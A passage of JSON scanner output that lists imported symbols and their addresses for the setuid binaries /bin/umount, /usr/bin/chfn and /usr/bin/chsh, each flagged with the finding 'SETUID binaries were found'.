                        "/bin/umount",
                        "0x00008fd0",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fd8",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fe0",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008fe8",
                        "environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ff0",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00008ff8",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00009020",
                        "__progname",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00009028",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00009030",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00009040",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/umount",
                        "0x00009060",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x000032d0",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x00003370",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc38",
                        "__strcat_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc40",
                        "utime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc48",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc50",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc58",
                        "is_selinux_enabled",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc60",
                        "strcasecmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc68",
                        "closelog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc70",
                        "pam_start",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc78",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc80",
                        "unlink",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc88",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc90",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dc98",
                        "strcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dca0",
                        "chroot",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dca8",
                        "puts",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcb0",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcb8",
                        "lckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcc0",
                        "qsort",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcc8",
                        "selinux_check_access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcd0",
                        "fcntl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcd8",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dce0",
                        "getpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dce8",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcf0",
                        "__open_2",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dcf8",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd00",
                        "getpwuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd08",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd10",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd18",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd20",
                        "__lxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd28",
                        "getpwuid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd30",
                        "pam_end",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd38",
                        "chdir",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd40",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd48",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd50",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd58",
                        "pam_strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd60",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd68",
                        "snprintf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd70",
                        "audit_open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd78",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd80",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd88",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd90",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dd98",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dda0",
                        "selinux_set_callback",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dda8",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddb0",
                        "strspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddb8",
                        "matchpathcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddc0",
                        "fputc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddc8",
                        "strcspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddd0",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddd8",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dde0",
                        "execve",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dde8",
                        "calloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddf0",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ddf8",
                        "putc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de00",
                        "signal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de08",
                        "strtoll",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de10",
                        "__memcpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de18",
                        "getprevcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de20",
                        "feof",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de28",
                        "umask",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de30",
                        "strtol",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de38",
                        "realpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de40",
                        "getgrnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de48",
                        "kill",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de50",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de58",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de60",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de68",
                        "setfscreatecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de70",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de78",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de80",
                        "__vasprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de88",
                        "__fxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de90",
                        "getlogin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000de98",
                        "fseek",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dea0",
                        "security_getenforce",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dea8",
                        "__fgets_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000deb0",
                        "__strncpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000deb8",
                        "setrlimit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dec0",
                        "setreuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dec8",
                        "setregid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ded0",
                        "realloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ded8",
                        "fdopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dee0",
                        "getpwnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dee8",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000def0",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000def8",
                        "fchmod",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df00",
                        "__syslog_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df08",
                        "fsync",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df10",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df18",
                        "open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df20",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df28",
                        "fchown",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df30",
                        "audit_log_user_avc_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df38",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df40",
                        "ulckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df48",
                        "perror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df50",
                        "rename",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df58",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df60",
                        "openlog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df68",
                        "pam_acct_mgmt",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df70",
                        "freecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df78",
                        "link",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df80",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df88",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df90",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000df98",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfa0",
                        "pam_authenticate",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfa8",
                        "putpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfb0",
                        "strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfb8",
                        "sleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfc0",
                        "getc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfc8",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfd0",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfd8",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfe0",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dfe8",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dff0",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000dff8",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000e120",
                        "misc_conv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000eb88",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000eb90",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ebc0",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ebd0",
                        "stdin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ebd8",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ebe0",
                        "__environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ebe8",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chfn",
                        "0x0000ec00",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x000032b0",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc58",
                        "utime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc60",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc68",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc70",
                        "is_selinux_enabled",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc78",
                        "closelog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc80",
                        "pam_start",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc88",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc90",
                        "unlink",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cc98",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cca0",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cca8",
                        "strcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccb0",
                        "chroot",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccb8",
                        "puts",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccc0",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccc8",
                        "lckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccd0",
                        "qsort",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccd8",
                        "selinux_check_access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cce0",
                        "fcntl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cce8",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccf0",
                        "getpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ccf8",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd00",
                        "__open_2",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd08",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd10",
                        "getpwuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd18",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd20",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd28",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd30",
                        "__lxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd38",
                        "getpwuid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd40",
                        "pam_end",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd48",
                        "chdir",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd50",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd58",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd60",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd68",
                        "pam_strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd70",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd78",
                        "snprintf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd80",
                        "audit_open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd88",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd90",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cd98",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cda0",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cda8",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdb0",
                        "setusershell",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdb8",
                        "selinux_set_callback",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdc0",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdc8",
                        "matchpathcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdd0",
                        "fputc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdd8",
                        "getusershell",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cde0",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cde8",
                        "execve",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdf0",
                        "calloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cdf8",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce00",
                        "putc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce08",
                        "signal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce10",
                        "strtoll",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce18",
                        "__memcpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce20",
                        "getprevcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce28",
                        "feof",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce30",
                        "umask",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce38",
                        "realpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce40",
                        "getgrnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce48",
                        "kill",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce50",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce58",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce60",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce68",
                        "setfscreatecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce70",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce78",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce80",
                        "__vasprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce88",
                        "__fxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce90",
                        "getlogin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ce98",
                        "fseek",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cea0",
                        "security_getenforce",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cea8",
                        "__fgets_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ceb0",
                        "__strncpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ceb8",
                        "setrlimit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cec0",
                        "setreuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cec8",
                        "setregid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ced0",
                        "realloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000ced8",
                        "fdopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cee0",
                        "getpwnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cee8",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cef0",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cef8",
                        "fchmod",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf00",
                        "__syslog_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf08",
                        "fsync",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf10",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf18",
                        "open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf20",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf28",
                        "fchown",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf30",
                        "audit_log_user_avc_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf38",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf40",
                        "ulckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf48",
                        "perror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf50",
                        "rename",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf58",
                        "openlog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf60",
                        "pam_acct_mgmt",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf68",
                        "freecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf70",
                        "link",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf78",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf80",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf88",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf90",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cf98",
                        "pam_authenticate",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfa0",
                        "putpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfa8",
                        "strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfb0",
